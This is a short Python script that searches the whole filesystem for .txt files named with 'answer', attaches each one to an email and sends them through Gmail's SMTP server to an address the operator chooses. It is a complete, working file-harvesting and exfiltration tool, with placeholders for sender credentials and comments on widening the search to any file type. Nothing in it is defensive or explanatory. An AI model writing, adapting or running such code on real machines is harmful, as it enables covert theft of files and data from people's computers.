import smtplib
from email.message import EmailMessage as email
import os
import time

# Time Measurement - used for debugging code and improving efficiency
starttime = time.time()

# Email Variables - Needed to specificy contents of email

fromaddr = "From Email" # Enter the email you wish to send the data from.
frompassword = "From Email Password" # Enter the password from the email here
toaddr = "To Email" # Enter the email you wish to receive the data on

# Functions - Serve different purposes
def findfile(name, extensions, path):
    files = []
    for dirpath, dirname, filename in os.walk(path):
        for item in filename:
            if str.lower(name) in str.lower(item):
                if extensions != []:
                    for extension in extensions:
                        if extension in item:
                            files.append(os.path.join(dirpath, item))
                else:
                    files.append(os.path.join(dirpath, item))
    return files

# Instructions on usage of findfile():
#   - Enter term that you want to search in the first parameter,
#   - Enter extensions you want to search for as the second parameter. Make sure to enter it as a list
#   - Leave the extension as a blank list if you want all file types
#   - Then for the third paramter add the root path you want to start searching from
#   - For the whole computer, put "/" for mac or "\" for windows (WARNING: UNSTABLE - some versions of windows may contain .lnk files which are against google t&cs and may lead to program crashing and email failing to send if no specific file extensions are selected)

# --------------------- main program starts here ---------------------------- #

files = findfile("answer", [".txt"], "/") #reference to instructions on findfile() if you want to change the file search

print("Files found!\n")
print("\n".join(files))

msg = email()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "File"

for file in files:
    with open(file, "rb") as data:
        filedata = data.read()
        filename = file.split("/") # splits the name by a "/" which is what seperates the structure of files
        filename = filename[-1] # takes the last item from the structure list as it will always be the name of the file. used for efficiency purposes when searching through recieved files
    msg.add_attachment(filedata, maintype="application", subtype="octet-stream", filename=filename)

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server: # Establishes connection with server
    server.login(fromaddr, frompassword) # Logs into server
    server.send_message(msg) # Sends message

# Prints time taken for program to run, used to measure and improve upon efficiency
print("Time taken: {} Seconds".format(round(time.time()-starttime, 2)))


